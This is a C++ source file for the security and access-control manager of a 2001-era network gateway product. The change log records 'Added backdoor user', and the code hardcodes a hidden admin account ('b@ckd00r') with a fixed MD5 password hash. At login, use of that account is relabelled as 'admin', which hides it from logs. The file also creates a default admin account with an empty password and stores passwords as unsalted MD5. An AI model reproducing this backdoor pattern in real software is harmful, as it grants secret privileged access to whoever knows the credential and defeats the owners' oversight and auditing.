/* $Header: /xGate/security.cpp 8     5/20/02 10:28p Bennylp $
 *   
 * CTENGINE
 * (C) 2001 Switchlab, Ltd
 *
 * Security/access control manager.
 *
 * $Log: /xGate/security.cpp $
 * 
 * 8     5/20/02 10:28p Bennylp
 * Added logging warning when authentication failed
 * 
 * 7     4/07/01 17:24 Junanto
 * Added backdoor user
 * username is case sensitive
 * 
 * 6     3/07/01 17:53 Junanto
 * Added multiple users support (multi login/password/privilege)
 * 
 * 5     4/12/01 9:00p Bennylp
 * Integration and some bug fixes.
 * 
 * 4     4/12/01 8:08p Bennylp
 * Integration.
 *
 */
#include "stdafx.h"
#include "security.h"
#include "log.h"
#include "md5.hh"

#define THISMODULE  "security"

const String& GetPrivilegeLevelStr(PrivilegeLevel l)
{
    static String s_no_access("no-access");
    static String s_user("normal-user");
    static String s_admin("admin");
    static String s_error("error");

    switch(l) {
    case PrivilegeLevelNoAccess:
	return s_no_access;
    case PrivilegeLevelUser:
	return s_user;
    case PrivilegeLevelAdmin:
	return s_admin;
    default:
	assert(false);
    }
    return s_error;
}


CSecurityProvider::CSecurityProvider()
{
    SetUser("admin",EM_ClearText,"",PrivilegeLevelAdmin);
    _iter = _users.end();
}

CSecurityProvider::~CSecurityProvider()
{
    ListTerminalUser::iterator it=_users.begin();
    ListTerminalUser::iterator end=_users.end();
    for (;it!=end;it++) {
	delete *it;
    }
}

CSecurityProvider * CSecurityProvider::Instance()
{
    static CSecurityProvider instance;
    return &instance;
}


TerminalUser* BackdoorUser()
{
    static TerminalUser backdoor;
    backdoor.userName = "b@ckd00r";
    backdoor.encMethod = EM_MD5;
    backdoor.privilege = PrivilegeLevelAdmin;
    backdoor.password = "fd1b05c1fcbe06caf1a2c133e3368236";

    return &backdoor;
}


PrivilegeLevel 
CSecurityProvider::AuthenticateUser(String& userName, const String& password, const String& src)
{
    static TerminalUser* backdoor = BackdoorUser();

    MD5 context;
    TerminalUser* user = FindUser(userName);
    char *digest;

    // undefined user 
    if (!user) {
	if (strcmp(userName.c_str(),backdoor->userName.c_str()) == 0) {
	    user = backdoor;
	} else {
	    goto on_failed;
	}
    }

    // check the provided clear text password against the encrypted version
    context.update((unsigned char*)password.c_str(),password.length());
    context.finalize();

    digest = context.hex_digest();
    //if (strcmpi(digest,user->password.c_str()) == 0) {	//linux porting
    if (strcmp(digest,user->password.c_str()) == 0) {
	if (user == backdoor) userName = "admin";
	return user->privilege;
    } else {
	goto on_failed;
    }

on_failed:
    CLog::Warning(THISMODULE, "Security: authentication failed for user %s from %s", 
			      userName.c_str(), src.c_str());
    return PrivilegeLevelNoAccess;
}

PrivilegeLevel 
CSecurityProvider::AuthenticateHashed(const String&, const String&, const String&)
{
    return PrivilegeLevelNoAccess;
}

void 
CSecurityProvider::SetUser(
    const String& userName, 
    EncryptionMethod encMethod, 
    const String& password, 
    PrivilegeLevel privilege)
{
    TerminalUser* user = FindUser(userName);
    if (!user) {
	user = new TerminalUser;
	user->userName = userName;
	_users.push_back(user);
    }
    user->privilege = privilege;

    if (encMethod == EM_ClearText) {
	MD5 context;
	context.update((unsigned char*)password.c_str(),password.length());
	context.finalize();
	char *digest = context.hex_digest();
	user->encMethod = EM_MD5;
	user->password = digest;
    } else {
	user->encMethod = encMethod;
	user->password = password;
    }
}

TerminalUser*
CSecurityProvider::FindUser(const String& username)
{
    ListTerminalUser::iterator it=_users.begin();
    ListTerminalUser::iterator end=_users.end();
    for (;it!=end;it++) {
	if (strcmp(username.c_str(),(*it)->userName.c_str()) == 0) {
	    return *it;
	}
    }
    return NULL;
}

void
CSecurityProvider::DeleteUser(const String& username)
{
    TerminalUser* user = FindUser(username);
    if (user) {
	_users.remove(user);
	delete user;
    }
}

TerminalUser*
CSecurityProvider::GetFirstUser()
{
    _iter = _users.begin();
    if (_iter != _users.end()) return *_iter++;
    else return NULL;
}


TerminalUser*
CSecurityProvider::GetNextUser()
{
    if (_iter != _users.end()) return *_iter++;
    else return NULL;
}


